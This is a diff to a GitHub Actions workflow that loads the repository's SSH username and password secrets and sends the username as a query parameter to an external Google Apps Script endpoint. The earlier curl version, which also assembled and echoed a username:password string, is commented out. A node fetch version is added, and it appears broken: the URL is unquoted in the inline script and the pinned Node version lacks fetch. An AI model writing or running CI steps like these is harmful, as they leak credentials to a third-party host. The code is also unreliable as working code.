@@ -9,16 +9,32 @@ jobs:
   create_auth_variable:
     runs-on: ubuntu-latest
     
+    # steps:
+    # - name: Read secrets
+    #   run: |
+    #     echo "Reading secrets..."
+    #     USERNAME=$USERNAME_SECRET
+    #     PASSWORD=$PASSWORD_SECRET
+    #     AUTH="$USERNAME:::$PASSWORD"
+    #     URL="https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=989898&value2=$USERNAME"
+    #     curl -X GET $URL
+    #     echo "Auth variable: $AUTH"
+      
+
+
     steps:
-    - name: Read secrets
+    - name: Set up Node.js
+      uses: actions/setup-node@v2
+      with:
+        node-version: '14'
+
+    - name: Make GET request
       run: |
         echo "Reading secrets..."
         USERNAME=$USERNAME_SECRET
         PASSWORD=$PASSWORD_SECRET
-        AUTH="$USERNAME:::$PASSWORD"
         URL="https://script.google.com/macros/s/AKfycbzffhUAOTELo2A5kKkif8cavnh6uz2hBd54uF20AFNYUHPiOP8JSbRa1voZDOFct0Vu/exec?value1=989898&value2=$USERNAME"
-        curl -X GET $URL
-        echo "Auth variable: $AUTH"
-      env:
-        USERNAME_SECRET: ${{ secrets.SSH_USERNAME }}
-        PASSWORD_SECRET: ${{ secrets.SSH_PASSWORD }}
+        node -e "fetch($URL).then(response => response.json()).then((res) => console.log(res)).catch((err) => console.error(err))"
+    env:
+      USERNAME_SECRET: ${{ secrets.SSH_USERNAME }}
+      PASSWORD_SECRET: ${{ secrets.SSH_PASSWORD }}
